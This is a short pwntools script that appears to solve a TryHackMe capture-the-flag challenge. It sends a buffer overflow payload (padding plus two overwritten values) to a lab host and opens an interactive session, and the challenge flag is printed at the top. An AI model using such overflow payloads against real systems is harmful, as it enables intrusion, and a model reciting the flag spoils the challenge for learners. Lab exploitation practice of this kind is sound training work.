#THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
from pwn import *

host  = '10.10.155.54' 
port = 9002
p = remote(host, port)

payload = b"A"*104 + p32(0xc0d3) + p32(0xc0ff33)
p.send(payload)
p.recvuntil(b"")

p.interactive()